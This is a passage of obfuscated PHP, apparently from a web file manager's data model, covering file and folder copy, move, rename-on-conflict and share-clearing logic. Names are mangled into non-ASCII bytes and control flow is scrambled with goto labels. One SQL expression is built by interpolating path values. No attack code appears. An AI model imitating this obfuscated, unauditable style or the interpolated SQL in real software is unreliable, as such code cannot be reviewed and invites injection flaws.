goto F‹²õù§ºÖ; D††ª¶¥ŞÅ: if (!$CªñÆÇ§Ü) { return $this->_copyCreate($E…àì³‡¯, $D…´Ş˜ó, $f¾¤‡ïİ×, $F¾ñËÑ‘¢¿); } $e¶ô£İ±ÇÈ = $CªñÆÇ§Ü; if ($DÆ „‹¦†²) { if ($f¹¥÷­‚‚å == REPEAT_RENAME_FOLDER) { $f¾¤‡ïİ× = $this->fileNameAutoCache($D…´Ş˜ó, $f¾¤‡ïİ×, $f¹¥÷­‚‚å, $DÆ „‹¦†²); $e¶ô£İ±ÇÈ = $this->_copyCreate($E…àì³‡¯, $D…´Ş˜ó, $f¾¤‡ïİ×, $F¾ñËÑ‘¢¿); } else { $F˜Õò¤¶§ˆ = $this->_childrenList($E…àì³‡¯); foreach ($F˜Õò¤¶§ˆ as $A¦šô•’§¶) { $this->_copy($A¦šô•’§¶[$cØõƒ×‰‡¬[365]], $CªñÆÇ§Ü, $f¹¥÷­‚‚å, $F¾ñËÑ‘¢¿, !1); } } } else { if ($f¹¥÷­‚‚å == REPEAT_RENAME || $f¹¥÷­‚‚å == REPEAT_RENAME_FOLDER) { $f¾¤‡ïİ× = $this->fileNameAutoCache($D…´Ş˜ó, $f¾¤‡ïİ×, $f¹¥÷­‚‚å, $DÆ „‹¦†²); $e¶ô£İ±ÇÈ = $this->_copyCreate($E…àì³‡¯, $D…´Ş˜ó, $f¾¤‡ïİ×, $F¾ñËÑ‘¢¿); } else { if ($f¹¥÷­‚‚å == REPEAT_REPLACE) { $eÈÆÚ§òéĞ = $this->sourceInfoCache($CªñÆÇ§Ü); $DÈ ÷Òô÷ª = $this->fileHistory($eÈÆÚ§òéĞ, $b¿†ö«ˆ£ğ[$cØõƒ×‰‡¬[373]], $b¿†ö«ˆ£ğ[$cØõƒ×‰‡¬[78]]); if ($DÈ ÷Òô÷ª) { $F¾ñËÑ‘¢¿[$cØõƒ×‰‡¬[368]][] = $b¿†ö«ˆ£ğ[$cØõƒ×‰‡¬[373]]; } } else { if ($f¹¥÷­‚‚å == REPEAT_SKIP) { } } } } goto aà’Ôö³è½; eí…›Ñé×: $f¾¤‡ïİ× = $f…ãÅ“Öå† ? $f…ãÅ“Öå† : $b¿†ö«ˆ£ğ[$cØõƒ×‰‡¬[28]]; $CªñÆÇ§Ü = $this->fileNameExistCache($D…´Ş˜ó, $f¾¤‡ïİ×); if ($DØ˜¯¿åÄ­) { $this->_childrenAllMake($E…àì³‡¯); if ($DÆ „‹¦†² && $CªñÆÇ§Ü) { $this->_childrenAllMake($CªñÆÇ§Ü); } } goto D††ª¶¥ŞÅ; F‹²õù§ºÖ: } private function _copyCreate($eªµäÖªà, $fåîŸ¾ÄÎ‹, $eá± ğÛ°Ö, &$cÓ—™‹‹ë) { goto eƒ‰â‰¯ğ¤; eƒ‰â‰¯ğ¤: $D‘Œê¥îƒ¥ =& $_SERVER[ÍÓÖ€°å]; $C¡¦ˆ£ˆĞ = $this->sourceInfoCache($eªµäÖªà); $EÛî‹¿øâ† = $this->sourceInfoCache($fåîŸ¾ÄÎ‹); goto fÆ’¯…©’ø; cªŠ¡¢ãµ: foreach ($fÈ‘ö‹š¿‚ as $Eìƒã«ª×) { $Eë…†•¬îá = $Eìƒã«ª×[$D‘Œê¥îƒ¥[365]]; $Dœ–‘íùĞ‹ = $this->_childrenMatch($aè¹¿œ´´Í, $Eìƒã«ª×, $cÒÑà‰ğî‘); $C¦¯Ñ¨Œ¿[] = array($D‘Œê¥îƒ¥[365], $Eë…†•¬îá, $D‘Œê¥îƒ¥[375], $Dœ–‘íùĞ‹[$D‘Œê¥îƒ¥[375]]); $fÔ×Ú ”ÓÃ[] = array($D‘Œê¥îƒ¥[365], $Eë…†•¬îá, $D‘Œê¥îƒ¥[364], $Dœ–‘íùĞ‹[$D‘Œê¥îƒ¥[364]]); $this->_copyApplyMeta($Eìƒã«ª×, $cÓ—™‹‹ë); if ($Eìƒã«ª×[$D‘Œê¥îƒ¥[366]] != $D‘Œê¥îƒ¥[367]) { $cÓ—™‹‹ë[$D‘Œê¥îƒ¥[368]][] = $Eìƒã«ª×[$D‘Œê¥îƒ¥[373]]; } } $this->saveAll($C¦¯Ñ¨Œ¿); $this->saveAll($fÔ×Ú ”ÓÃ); goto B÷¼ˆ¹ì¨¥; Bó¬ Â‚ˆ˜: if (count($c…Ë»œ»«…) == 0) { return $B—¼åÔªÛØ; } $cÒÑà‰ğî‘ = $this->sourceInfo($B—¼åÔªÛØ); foreach ($c…Ë»œ»«… as $Eìƒã«ª×) { $a¼Œ÷˜ßèÀ = $this->_makeItemData($Eìƒã«ª×, $cÒÑà‰ğî‘, $Eìƒã«ª×[$D‘Œê¥îƒ¥[28]]); $a¼Œ÷˜ßèÀ[$D‘Œê¥îƒ¥[364]] = $Eìƒã«ª×[$D‘Œê¥îƒ¥[364]]; $C‰ˆ­Êçœ—[] = $a¼Œ÷˜ßèÀ; } goto c‰„Ò¸’; bÍÅ¡í¼âî: $c…Ë»œ»«… = array(); $C‰ˆ­Êçœ— = array(); $this->_childrenListAll($eªµäÖªà, $c…Ë»œ»«…); goto Bó¬ Â‚ˆ˜; c‰„Ò¸’: $this->addAll($C‰ˆ­Êçœ—); $fÈ‘ö‹š¿‚ = $this->where(array($D‘Œê¥îƒ¥[375] => $B—¼åÔªÛØ))->select(); $aè¹¿œ´´Í = $this->_childrenMakeRelation($c…Ë»œ»«…, $fÈ‘ö‹š¿‚); goto C¬¥ÓÊãšè; C¬¥ÓÊãšè: $aè¹¿œ´´Í[$eªµäÖªà] = $B—¼åÔªÛØ; $C¦¯Ñ¨Œ¿ = array(); $fÔ×Ú ”ÓÃ = array(); goto cªŠ¡¢ãµ; fÆ’¯…©’ø: $B©²“·‰è‚ = $this->_makeItemData($C¡¦ˆ£ˆĞ, $EÛî‹¿øâ†, $eá± ğÛ°Ö); Hook::trigger($D‘Œê¥îƒ¥[374], $B©²“·‰è‚); $B—¼åÔªÛØ = $this->add($B©²“·‰è‚); goto f‚ËÄÌÄ¤·; B÷¼ˆ¹ì¨¥: return $B—¼åÔªÛØ; goto a“„ƒ‹ö´; f‚ËÄÌÄ¤·: $eà©§ååÆñ = array($D‘Œê¥îƒ¥[365] => $B—¼åÔªÛØ, $D‘Œê¥îƒ¥[28] => $eá± ğÛ°Ö); $this->_copyApplyMeta($eà©§ååÆñ, $cÓ—™‹‹ë); if ($C¡¦ˆ£ˆĞ[$D‘Œê¥îƒ¥[366]] != $D‘Œê¥îƒ¥[367]) { $cÓ—™‹‹ë[$D‘Œê¥îƒ¥[368]][] = $C¡¦ˆ£ˆĞ[$D‘Œê¥îƒ¥[373]]; return $B—¼åÔªÛØ; } goto bÍÅ¡í¼âî; a“„ƒ‹ö´: } private function _childrenMakeRelation($AÊÙßèõ–, $AÅ¤°İ÷–¯) { $Dñ¥ÀèÙ‹¡ =& $_SERVER[ÍÓÖ€°å]; $D¸ÛÊëìŞÎ = array(); $EÊÀœÎº²¢ = array(); foreach ($AÊÙßèõ– as $CÓ·ƒÍ‘¯‚) { $F³ÂéÇçÚÃ = $CÓ·ƒÍ‘¯‚[$Dñ¥ÀèÙ‹¡[28]] . $Dñ¥ÀèÙ‹¡[8] . $CÓ·ƒÍ‘¯‚[$Dñ¥ÀèÙ‹¡[364]]; $D¸ÛÊëìŞÎ[$F³ÂéÇçÚÃ] = $CÓ·ƒÍ‘¯‚[$Dñ¥ÀèÙ‹¡[365]]; } foreach ($AÅ¤°İ÷–¯ as $CÓ·ƒÍ‘¯‚) { $F³ÂéÇçÚÃ = $CÓ·ƒÍ‘¯‚[$Dñ¥ÀèÙ‹¡[28]] . $Dñ¥ÀèÙ‹¡[8] . $CÓ·ƒÍ‘¯‚[$Dñ¥ÀèÙ‹¡[364]]; $bÈöĞà§ÙŸ = $D¸ÛÊëìŞÎ[$F³ÂéÇçÚÃ]; $EÊÀœÎº²¢[$bÈöĞà§ÙŸ] = $CÓ·ƒÍ‘¯‚[$Dñ¥ÀèÙ‹¡[365]]; } return $EÊÀœÎº²¢; } private function _childrenMatch($aÖÖ½÷±‚î, $aÂïß±ÚĞÚ, $FÕÀ´Ú†òÍ) { goto dçÚÙ´¯È; f¨ª‡‰Ñõ: $D–à½‚ = $aÖÖ½÷±‚î[$D—¥öùÀ—[count($D—¥öùÀ—) - 1]]; foreach ($D—¥öùÀ— as $FØËÖµ‚Û•) { if (isset($aÖÖ½÷±‚î[$FØËÖµ‚Û•])) { $e¡Ê‚ò•–é .= $aÖÖ½÷±‚î[$FØËÖµ‚Û•] . $bÜ×Õ¬¢§‘[376]; } } $e¡Ê‚ò•–é = rtrim($e¡Ê‚ò•–é, $bÜ×Õ¬¢§‘[47]) . $bÜ×Õ¬¢§‘[47]; goto BÔÒÅó£ø­; BÔÒÅó£ø­: return array($bÜ×Õ¬¢§‘[375] => $D–à½‚, $bÜ×Õ¬¢§‘[364] => $e¡Ê‚ò•–é); goto EÑì­¦‘”‘; dçÚÙ´¯È: $bÜ×Õ¬¢§‘ =& $_SERVER[ÍÓÖ€°å]; $e¡Ê‚ò•–é = $FÕÀ´Ú†òÍ[$bÜ×Õ¬¢§‘[364]]; $D—¥öùÀ— = $this->parentLevelArray($aÂïß±ÚĞÚ[$bÜ×Õ¬¢§‘[364]]); goto f¨ª‡‰Ñõ; EÑì­¦‘”‘: } private function _makeItemData($fô–í†Œ, $AÊ„ÃÜ¶–Ê, $aĞš¨¸Ù¯˜) { $A‘Œ«­ïœ =& $_SERVER[ÍÓÖ€°å]; $bãØÇÏ = array($A‘Œ«­ïœ[377] => $fô–í†Œ[$A‘Œ«­ïœ[366]], $A‘Œ«­ïœ[378] => $aĞš¨¸Ù¯˜, $A‘Œ«­ïœ[379] => $fô–í†Œ[$A‘Œ«­ïœ[380]], $A‘Œ«­ïœ[381] => $fô–í†Œ[$A‘Œ«­ïœ[373]], $A‘Œ«­ïœ[382] => $fô–í†Œ[$A‘Œ«­ïœ[78]], $A‘Œ«­ïœ[383] => $AÊ„ÃÜ¶–Ê[$A‘Œ«­ïœ[384]], $A‘Œ«­ïœ[385] => $AÊ„ÃÜ¶–Ê[$A‘Œ«­ïœ[386]], $A‘Œ«­ïœ[387] => USER_ID, $A‘Œ«­ïœ[388] => USER_ID, $A‘Œ«­ïœ[389] => $AÊ„ÃÜ¶–Ê[$A‘Œ«­ïœ[365]], $A‘Œ«­ïœ[390] => $AÊ„ÃÜ¶–Ê[$A‘Œ«­ïœ[364]] . $AÊ„ÃÜ¶–Ê[$A‘Œ«­ïœ[365]] . $A‘Œ«­ïœ[47], $A‘Œ«­ïœ[391] => 0); return $bãØÇÏ; } private function _copyApplyMeta($DĞÃ„£‰Í, &$eÉóÜ¦Ùõ÷) { $dÂ…‘¡¶ø =& $_SERVER[ÍÓÖ€°å]; $b…øÂ‰Œ = $DĞÃ„£‰Í[$dÂ…‘¡¶ø[365]]; $b«Ûß¼¿‡Ö = $DĞÃ„£‰Í[$dÂ…‘¡¶ø[28]]; if (!isset($DĞÃ„£‰Í[$dÂ…‘¡¶ø[392]]) || !$DĞÃ„£‰Í[$dÂ…‘¡¶ø[392]] || $DĞÃ„£‰Í[$dÂ…‘¡¶ø[392]] == $dÂ…‘¡¶ø[393]) { $eÉóÜ¦Ùõ÷[$dÂ…‘¡¶ø[370]][] = array($dÂ…‘¡¶ø[365], $b…øÂ‰Œ, $dÂ…‘¡¶ø[392], short_id($b…øÂ‰Œ)); } if (Input::check($b«Ûß¼¿‡Ö, $dÂ…‘¡¶ø[394])) { $eÉóÜ¦Ùõ÷[$dÂ…‘¡¶ø[369]][] = array($dÂ…‘¡¶ø[365] => $b…øÂ‰Œ, $dÂ…‘¡¶ø[88] => $dÂ…‘¡¶ø[395], $dÂ…‘¡¶ø[348] => str_replace($dÂ…‘¡¶ø[50], $dÂ…‘¡¶ø[33], Pinyin::encode($b«Ûß¼¿‡Ö))); $eÉóÜ¦Ùõ÷[$dÂ…‘¡¶ø[369]][] = array($dÂ…‘¡¶ø[365] => $b…øÂ‰Œ, $dÂ…‘¡¶ø[88] => $dÂ…‘¡¶ø[396], $dÂ…‘¡¶ø[348] => Pinyin::encode($b«Ûß¼¿‡Ö, $dÂ…‘¡¶ø[397])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($bØ²‘Û›í¼) { goto Cáß·ÚÂÎ; Cáß·ÚÂÎ: $bÂ‰›¶Ø´° =& $_SERVER[ÍÓÖ€°å]; $dÊ•Ìø—ßÈ = $this->sourceInfo($bØ²‘Û›í¼); $BÁ¬‹º”š = $bÂ‰›¶Ø´°[398]; goto A°››Ë¶éÀ; bØ„áÓÚ¾¼: $Bƒ‰ØÙ–Ó¹ = array_to_keyvalue($Bƒ‰ØÙ–Ó¹, $bÂ‰›¶Ø´°[365]); foreach ($Bƒ‰ØÙ–Ó¹ as $eÎß¡òÇ‹) { $D¤ˆŠæ‹œ = $eÎß¡òÇ‹[$bÂ‰›¶Ø´°[375]]; $bØ²‘Û›í¼ = $eÎß¡òÇ‹[$bÂ‰›¶Ø´°[365]]; if (!isset($this->_childrenListCache[$bØ²‘Û›í¼]) && $eÎß¡òÇ‹[$bÂ‰›¶Ø´°[366]] == $bÂ‰›¶Ø´°[367]) { $this->_childrenListCache[$bØ²‘Û›í¼] = array(); } if (!isset($this->_childrenListCache[$D¤ˆŠæ‹œ])) { $this->_childrenListCache[$D¤ˆŠæ‹œ] = array(); } $this->_childrenListCache[$D¤ˆŠæ‹œ][$bØ²‘Û›í¼] = $eÎß¡òÇ‹; $this->_childrenItemCache[$bØ²‘Û›í¼] = $eÎß¡òÇ‹; } goto FÅ‚Ö¡ë¿–; A°››Ë¶éÀ: $Cí¡áŒÛƒá = array($bÂ‰›¶Ø´°[364] => array($bÂ‰›¶Ø´°[399], $dÊ•Ìø—ßÈ[$bÂ‰›¶Ø´°[364]] . $bØ²‘Û›í¼ . $bÂ‰›¶Ø´°[400]), $bÂ‰›¶Ø´°[401] => 0); $Bƒ‰ØÙ–Ó¹ = $this->field($BÁ¬‹º”š)->where($Cí¡áŒÛƒá)->select(); if (!$Bƒ‰ØÙ–Ó¹) { return; } goto bØ„áÓÚ¾¼; FÅ‚Ö¡ë¿–: } private function _childrenListAll($dÉÃÒ‡™å, &$BáÌ‡Ô±¹Ù) { $A¿æßùà‚— =& $_SERVER[ÍÓÖ€°å]; if (!isset($this->_childrenListCache[$dÉÃÒ‡™å])) { return; } $c½î¡Ùè™‚ = $this->_childrenListCache[$dÉÃÒ‡™å]; foreach ($c½î¡Ùè™‚ as $Fáˆ¹‡–Óˆ => $d‚àâ™Ïå©) { $BáÌ‡Ô±¹Ù[$Fáˆ¹‡–Óˆ] = $d‚àâ™Ïå©; if ($d‚àâ™Ïå©[$A¿æßùà‚—[366]] == $A¿æßùà‚—[367]) { $this->_childrenListAll($Fáˆ¹‡–Óˆ, $BáÌ‡Ô±¹Ù); } } } private function sourceInfoCache($D‡õ°Çë¥Â) { if (isset($this->_childrenItemCache[$D‡õ°Çë¥Â])) { return $this->_childrenItemCache[$D‡õ°Çë¥Â]; } return $this->sourceInfo($D‡õ°Çë¥Â); } private function _childrenList($fôàâšŒÏ) { if (isset($this->_childrenListCache[$fôàâšŒÏ])) { return $this->_childrenListCache[$fôàâšŒÏ]; } return $this->_childrenListSelect($fôàâšŒÏ); } private function _childrenListSelect($E÷¡…Ë²¨¨) { goto FÊ°ìùŒÉ; f…ŒÀ¯‹öÈ: $BÓ³²Ÿ‹ = $BÓ³²Ÿ‹ ? $BÓ³²Ÿ‹ : array(); $dİßÒÁß– = array_to_keyvalue($BÓ³²Ÿ‹, $CÄ“†è™­»[365]); $this->_childrenListCache[$E÷¡…Ë²¨¨] = $dİßÒÁß–; goto Dî«¿œß§‚; Dî«¿œß§‚: foreach ($dİßÒÁß– as $E÷¡…Ë²¨¨ => $EáÑ‘´óÂó) { $this->_childrenItemCache[$E÷¡…Ë²¨¨] = $EáÑ‘´óÂó; } return $dİßÒÁß–; goto EÔ½ÛÌÛùÕ; FÊ°ìùŒÉ: $CÄ“†è™­» =& $_SERVER[ÍÓÖ€°å]; $C£±Œ˜½ŠÌ = array($CÄ“†è™­»[375] => $E÷¡…Ë²¨¨, $CÄ“†è™­»[401] => 0); $BÓ³²Ÿ‹ = $this->where($C£±Œ˜½ŠÌ)->select(); goto f…ŒÀ¯‹öÈ; EÔ½ÛÌÛùÕ: } private function fileNameExistCache($D‡®­²‡íô, $fµ·ÈØÇ¼°) { $CŠè‘³“é =& $_SERVER[ÍÓÖ€°å]; $fµ·ÈØÇ¼° = strtolower($fµ·ÈØÇ¼°); $féÎ‹ˆö˜ñ = $this->_childrenList($D‡®­²‡íô); foreach ($féÎ‹ˆö˜ñ as $f‰áÆ¹’ª») { if ($fµ·ÈØÇ¼° == strtolower($f‰áÆ¹’ª»[$CŠè‘³“é[28]])) { return $f‰áÆ¹’ª»[$CŠè‘³“é[365]]; } } return !1; } private function fileNameAutoCache($a‰³æ±„Ç, $CøÏ¢„ù¥Œ, $E¼ã¹§¹Æ÷, $BÀ¦…õŞÇ‡) { $F¯ÓŒ§¦×ó =& $_SERVER[ÍÓÖ€°å]; $fç±ôöÖá = $this->_childrenList($a‰³æ±„Ç); $EŠÀœ–› = array_to_keyvalue($fç±ôöÖá, $F¯ÓŒ§¦×ó[33], $F¯ÓŒ§¦×ó[28]); return $this->fileNameAutoGet($EŠÀœ–›, $CøÏ¢„ù¥Œ, $E¼ã¹§¹Æ÷, $BÀ¦…õŞÇ‡); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($fã¨¯ÔØ¢ƒ, $DŒ¶‚Åóª·, $bÚŒ³Ò‹×Â = REPEAT_REPLACE, $f¦ ˆ¥¨ö = '') { goto f‡ ö÷·‹‰; D…¨çÜÎĞ: if ($this->isParentOf($fã¨¯ÔØ¢ƒ, $DŒ¶‚Åóª·)) { return !1; } if (!$Aˆ‘Âª°Š || !$B‹ŞìÇŸ³Ÿ || $B‹ŞìÇŸ³Ÿ[$aÃª•ñº†î[366]] != $aÃª•ñº†î[367]) { return !1; } if ($Aˆ‘Âª°Š[$aÃª•ñº†î[375]] == $DŒ¶‚Åóª· && $f¦ ˆ¥¨ö != $Aˆ‘Âª°Š[$aÃª•ñº†î[28]]) { $B¬Ó›œëÆ‡ = $this->fileNameExist($DŒ¶‚Åóª·, $f¦ ˆ¥¨ö); if ($B¬Ó›œëÆ‡ && $Aˆ‘Âª°Š[$aÃª•ñº†î[366]] == $aÃª•ñº†î[393]) { $aä¡¨à™†™ = $this->sourceInfo($B¬Ó›œëÆ‡); $d»®ÆéäÖò = $this->fileHistory($aä¡¨à™†™, $Aˆ‘Âª°Š[$aÃª•ñº†î[373]], $Aˆ‘Âª°Š[$aÃª•ñº†î[78]]); if (!$d»®ÆéäÖò) { Model($aÃª•ñº†î[402])->remove($Aˆ‘Âª°Š[$aÃª•ñº†î[373]]); } $this->remove($fã¨¯ÔØ¢ƒ, !1); $this->folderSizeReset($DŒ¶‚Åóª·); return $B¬Ó›œëÆ‡; } } goto C×îô•ë¦’; f‡ ö÷·‹‰: $aÃª•ñº†î =& $_SERVER[ÍÓÖ€°å]; $Aˆ‘Âª°Š = $this->sourceInfo($fã¨¯ÔØ¢ƒ); $B‹ŞìÇŸ³Ÿ = $this->sourceInfo($DŒ¶‚Åóª·); goto D…¨çÜÎĞ; e½¢À¯¬ŸÒ: $A†õÄ„„¨ = $this->_move($fã¨¯ÔØ¢ƒ, $DŒ¶‚Åóª·, $bÚŒ³Ò‹×Â, $Cãä‹¿‰˜¾, $f¦ ˆ¥¨ö); $this->sourceCacheClear(); if ($Aˆ‘Âª°Š[$aÃª•ñº†î[366]] == $aÃª•ñº†î[367] && $E×êÓ­ñ‘Ñ) { $this->folderSizeResetChildren($A†õÄ„„¨); } goto DˆĞ‚‰¸íÙ; E®®¨®Ä½Ï: $this->folderSizeReset($DŒ¶‚Åóª·); $aŒĞ…†ìİ‹ = array($Aˆ‘Âª°Š[$aÃª•ñº†î[375]], $DŒ¶‚Åóª·); if ($Aˆ‘Âª°Š[$aÃª•ñº†î[366]] == $aÃª•ñº†î[367]) { $aŒĞ…†ìİ‹[] = $fã¨¯ÔØ¢ƒ; } goto cœÕŒ÷Œò; C×îô•ë¦’: $Cãä‹¿‰˜¾ = array($aÃª•ñº†î[368] => array(), $aÃª•ñº†î[403] => !1); $this->clearShare($fã¨¯ÔØ¢ƒ, $DŒ¶‚Åóª·); $E×êÓ­ñ‘Ñ = $this->fileNameExistCache($DŒ¶‚Åóª·, $Aˆ‘Âª°Š[$aÃª•ñº†î[28]]); goto e½¢À¯¬ŸÒ; DˆĞ‚‰¸íÙ: Model($aÃª•ñº†î[155])->linkAdd($Cãä‹¿‰˜¾[$aÃª•ñº†î[368]]); if ($E×êÓ­ñ‘Ñ && $Cãä‹¿‰˜¾[$aÃª•ñº†î[403]]) { $this->remove($fã¨¯ÔØ¢ƒ, !1); } $this->folderSizeReset($Aˆ‘Âª°Š[$aÃª•ñº†î[375]]); goto E®®¨®Ä½Ï; cœÕŒ÷Œò: $this->updateModifyTime($aŒĞ…†ìİ‹); Model($aÃª•ñº†î[372])->eventMove($fã¨¯ÔØ¢ƒ, $Aˆ‘Âª°Š[$aÃª•ñº†î[375]], $DŒ¶‚Åóª·); return $A†õÄ„„¨; goto AôÒè»æ«×; AôÒè»æ«×: } private function _move($bƒ¯ç¶ªš¶, $f“è­ÓÈˆÄ, $EóÛ´Ê£«ª, &$bªäŞëÇè„, $cË¼àœêà† = '') { goto B¡“ÖŠÂø¨; B¡“ÖŠÂø¨: $aÎí¦Š²ÕŠ =& $_SERVER[ÍÓÖ€°å]; $B£÷ìÕõ³Ó = $this->sourceInfo($bƒ¯ç¶ªš¶); $F‚ÂñÕò™‹ = $B£÷ìÕõ³Ó[$aÎí¦Š²ÕŠ[366]] == $aÎí¦Š²ÕŠ[367]; goto FÎŠ´‰’Ò¥; d‚³¿ä×à’: if ($d³…æº•‚È && !$bªäŞëÇè„[$aÎí¦Š²ÕŠ[403]]) { $bªäŞëÇè„[$aÎí¦Š²ÕŠ[403]] = !0; } return $B¿¿Œß‹óİ; goto f×ù¿¢…ù“; FÎŠ´‰’Ò¥: $dù„õ·ŞÙ‡ = $cË¼àœêà† ? $cË¼àœêà† : $B£÷ìÕõ³Ó[$aÎí¦Š²ÕŠ[28]]; $d¹‹ÉºÛ² = $this->fileNameExistCache($f“è­ÓÈˆÄ, $dù„õ·ŞÙ‡); if (!$d¹‹ÉºÛ²) { return $this->_moveForce($bƒ¯ç¶ªš¶, $f“è­ÓÈˆÄ, $dù„õ·ŞÙ‡); } goto EÈè‡ƒ³â°; EÈè‡ƒ³â°: $B¿¿Œß‹óİ = $d¹‹ÉºÛ²; $d³…æº•‚È = !1; if ($F‚ÂñÕò™‹) { if ($EóÛ´Ê£«ª == REPEAT_RENAME_FOLDER) { $dù„õ·ŞÙ‡ = $this->fileNameAuto($f“è­ÓÈˆÄ, $dù„õ·ŞÙ‡, $EóÛ´Ê£«ª, $F‚ÂñÕò™‹); $B¿¿Œß‹óİ = $this->_moveForce($bƒ¯ç¶ªš¶, $f“è­ÓÈˆÄ, $dù„õ·ŞÙ‡); } else { if ($EóÛ´Ê£«ª == REPEAT_RENAME_FOLDER) { $EóÛ´Ê£«ª = REPEAT_RENAME; } $cİ°öïÈÎà = $this->_childrenListSelect($bƒ¯ç¶ªš¶); foreach ($cİ°öïÈÎà as $F‹Í‚ŠßÊÓ) { $this->_move($F‹Í‚ŠßÊÓ[$aÎí¦Š²ÕŠ[365]], $d¹‹ÉºÛ², $EóÛ´Ê£«ª, $bªäŞëÇè„); } $d³…æº•‚È = !0; } } else { if ($EóÛ´Ê£«ª == REPEAT_SKIP) { $d³…æº•‚È = !0; } else { if ($EóÛ´Ê£«ª == REPEAT_RENAME || $EóÛ´Ê£«ª == REPEAT_RENAME_FOLDER) { $dù„õ·ŞÙ‡ = $this->fileNameAuto($f“è­ÓÈˆÄ, $dù„õ·ŞÙ‡, $EóÛ´Ê£«ª, $F‚ÂñÕò™‹); $B¿¿Œß‹óİ = $this->_moveForce($bƒ¯ç¶ªš¶, $f“è­ÓÈˆÄ, $dù„õ·ŞÙ‡); } else { if ($EóÛ´Ê£«ª == REPEAT_REPLACE) { $BÀ¯¥çß‡Ê = $this->sourceInfoCache($d¹‹ÉºÛ²); $Bã³˜ ÃÛ = $this->fileHistory($BÀ¯¥çß‡Ê, $B£÷ìÕõ³Ó[$aÎí¦Š²ÕŠ[373]], $B£÷ìÕõ³Ó[$aÎí¦Š²ÕŠ[78]]); if ($Bã³˜ ÃÛ) { $bªäŞëÇè„[$aÎí¦Š²ÕŠ[368]][] = $B£÷ìÕõ³Ó[$aÎí¦Š²ÕŠ[373]]; } else { $d³…æº•‚È = !0; } } } } } goto d‚³¿ä×à’; f×ù¿¢…ù“: } private function _moveForce($cèå‰¼ï¸Á, $e©ùÆ¡à î, $BØãÒô†®é) { goto EÓÆ¹âëìô; còâÇéÎ„Œ: if (!$Có¡º†ïèË) { Model($FéÍµé¹ò[404])->authClear($cèå‰¼ï¸Á); } if ($CáÆ°Ôğ‰) { $b÷ÏïîË«İ = array($FéÍµé¹ò[390] => array($FéÍµé¹ò[399], $cµÜ‡¤ˆèŒ[$FéÍµé¹ò[364]] . $cµÜ‡¤ˆèŒ[$FéÍµé¹ò[365]] . $FéÍµé¹ò[400])); $D¡Ñùò®ëë = $cµÜ‡¤ˆèŒ[$FéÍµé¹ò[364]] . $cµÜ‡¤ˆèŒ[$FéÍµé¹ò[365]] . $FéÍµé¹ò[47]; $B¿¶Ò’º½ = $A±ÁĞ¸ê Á[$FéÍµé¹ò[364]] . $A±ÁĞ¸ê Á[$FéÍµé¹ò[365]] . $FéÍµé¹ò[47] . $cµÜ‡¤ˆèŒ[$FéÍµé¹ò[365]] . $FéÍµé¹ò[47]; $DçìÔğŞ¨ = array($FéÍµé¹ò[390] => array($FéÍµé¹ò[405], "\x72\145\160\154\x61\x63\x65\50\x70\141\162\145\156\x74\x4c\145\166\145\x6c\54\47{$D¡Ñùò®ëë}\47\54\47{$B¿¶Ò’º½}\x27\51"), $FéÍµé¹ò[383] => $A±ÁĞ¸ê Á[$FéÍµé¹ò[384]], $FéÍµé¹ò[385] => $A±ÁĞ¸ê Á[$FéÍµé¹ò[386]], $FéÍµé¹ò[391] => 0); $this->where($b÷ÏïîË«İ)->data($DçìÔğŞ¨)->save(); } $this->where(array($FéÍµé¹ò[406] => $cèå‰¼ï¸Á))->data($Fì›ãÙŒãù)->save(); goto e¾æßÉ¸œñ; EÓÆ¹âëìô: $FéÍµé¹ò =& $_SERVER[ÍÓÖ€°å]; $cµÜ‡¤ˆèŒ = $this->sourceInfo($cèå‰¼ï¸Á); $A±ÁĞ¸ê Á = $this->sourceInfo($e©ùÆ¡à î); goto fÄ½‚÷ˆàá; fÄ½‚÷ˆàá: $CáÆ°Ôğ‰ = $cµÜ‡¤ˆèŒ[$FéÍµé¹ò[366]] == $FéÍµé¹ò[367]; $Fì›ãÙŒãù = array($FéÍµé¹ò[389] => $A±ÁĞ¸ê Á[$FéÍµé¹ò[365]], $FéÍµé¹ò[390] => $A±ÁĞ¸ê Á[$FéÍµé¹ò[364]] . $A±ÁĞ¸ê Á[$FéÍµé¹ò[365]] . $FéÍµé¹ò[47], $FéÍµé¹ò[383] => $A±ÁĞ¸ê Á[$FéÍµé¹ò[384]], $FéÍµé¹ò[385] => $A±ÁĞ¸ê Á[$FéÍµé¹ò[386]], $FéÍµé¹ò[388] => USER_ID, $FéÍµé¹ò[391] => 0, $FéÍµé¹ò[378] => $BØãÒô†®é); $Có¡º†ïèË = $cµÜ‡¤ˆèŒ[$FéÍµé¹ò[384]] == SourceModel::TYPE_GROUP && $A±ÁĞ¸ê Á[$FéÍµé¹ò[384]] == SourceModel::TYPE_GROUP && $cµÜ‡¤ˆèŒ[$FéÍµé¹ò[386]] == $A±ÁĞ¸ê Á[$FéÍµé¹ò[386]]; goto còâÇéÎ„Œ; e¾æßÉ¸œñ: return $cèå‰¼ï¸Á; goto AŞë°ÎùÑ„; AŞë°ÎùÑ„: } private function clearShare($A÷èÅê•›, $b•¹‘½šà) { goto då„ÔæÉ•; fÖÏÛ«‘—´: if (!$f¦Á¶Àå’Û) { return; } $C½éæ¢ã˜ = array($E–°¡¸¯†Û[365] => array($E–°¡¸¯†Û[7], $f¦Á¶Àå’Û), $E–°¡¸¯†Û[408] => 1); $e™¼îšÅÆ = Model($E–°¡¸¯†Û[409])->field($E–°¡¸¯†Û[410])->where($C½éæ¢ã˜)->select(); goto c·Íæ¶À‰£; dÁæó›œ›: if ($aÚ‹•Æƒ¨[$E–°¡¸¯†Û[386]] == $Eí«Š¤Âƒ[$E–°¡¸¯†Û[386]] && $aÚ‹•Æƒ¨[$E–°¡¸¯†Û[384]] == $E–°¡¸¯†Û[407]) { return; } $C½éæ¢ã˜ = array($E–°¡¸¯†Û[364] => array($E–°¡¸¯†Û[399], $aÚ‹•Æƒ¨[$E–°¡¸¯†Û[364]] . $A÷èÅê•› . $E–°¡¸¯†Û[400]), $E–°¡¸¯†Û[401] => 0); $f¦Á¶Àå’Û = $this->field($E–°¡¸¯†Û[406])->where($C½éæ¢ã˜)->getField($E–°¡¸¯†Û[365], !0); goto fÖÏÛ«‘—´; då„ÔæÉ•: $E–°¡¸¯†Û =& $_SERVER[ÍÓÖ€°å]; $aÚ‹•Æƒ¨ = $this->sourceInfo($A÷èÅê•›); $Eí«Š¤Âƒ = $this->sourceInfo($b•¹‘½šà); goto 